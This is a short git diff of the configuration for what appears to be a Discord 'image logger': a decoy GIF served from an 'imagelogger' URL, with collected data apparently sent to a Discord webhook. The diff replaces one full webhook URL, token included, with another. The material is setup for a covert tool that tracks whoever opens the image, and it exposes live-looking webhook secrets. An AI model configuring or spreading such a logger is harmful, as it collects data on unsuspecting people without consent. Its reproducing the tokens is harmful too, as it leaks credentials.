@@ -9,7 +9,7 @@ __author__ = "ItzIcyHere"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1344314675579453523/Oe4cQ9jYPQ7rtiwF5E-RWxQO-PwmSWdLfjshkW1va0JtwcyGw0oSdwIle5dS49sCqW_J",
+    "webhook": "https://discord.com/api/webhooks/1344876753289482362/vmJ30Ih0AXtik91_B00pRxdgiNvtHJNc0D8YBRJaqtE80D5CxQ9jU2ZXgPFlWh-EVUBs",
     "image": "https://media1.tenor.com/m/_whxQHNAYAYAAAAC/spaghetti-mafia-yo-bad-gyal.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
